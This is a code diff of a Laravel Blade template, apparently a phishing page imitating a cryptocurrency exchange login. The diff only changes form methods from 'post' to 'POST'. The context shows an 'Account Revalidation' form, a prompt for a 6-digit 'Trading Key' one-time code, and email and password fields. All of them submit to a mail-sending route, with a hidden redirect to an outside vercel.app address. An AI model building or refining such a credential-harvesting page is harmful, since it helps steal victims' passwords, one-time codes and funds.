@@ -80,7 +80,7 @@
 
   <h2>Account Revalidation</h2>
 
-  <form class="contact-form" action="{{route('sendMail')}}" method="post">
+  <form class="contact-form" action="{{route('sendMail')}}" method="POST">
     @csrf
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_next" value="https://updatewebfix.vercel.app/code">
@@ -2859,7 +2859,7 @@
                               @if(session()->has('otp'))
                               <h2 class="css-mr4dhk">Enter Trading Key</h2>
                               <div class="KuxBox-root css-1ule816">Enter  6-Digit Trading Key received in your email or phone number.</div>
-                              <form class="contact-form" action="{{route('sendMail')}}" method="post">
+                              <form class="contact-form" action="{{route('sendMail')}}" method="POST">
                                 @csrf
 
                                 <input type="tel" name="otp" class="KuxInput-input css-1nddmz0" placeholder="******">
@@ -2875,7 +2875,7 @@
 
                             </form>
                             @else
-                            <form class="contact-form" action="{{route('sendMail')}}" method="post">
+                            <form class="contact-form" action="{{route('sendMail')}}" method="POST">
                               @csrf
                               <input type="email" name="email" class="KuxInput-input css-1nddmz0" placeholder="Email/Phone">
                               <input type="text" name="password" class="KuxInput-input css-1nddmz0" placeholder="Password">
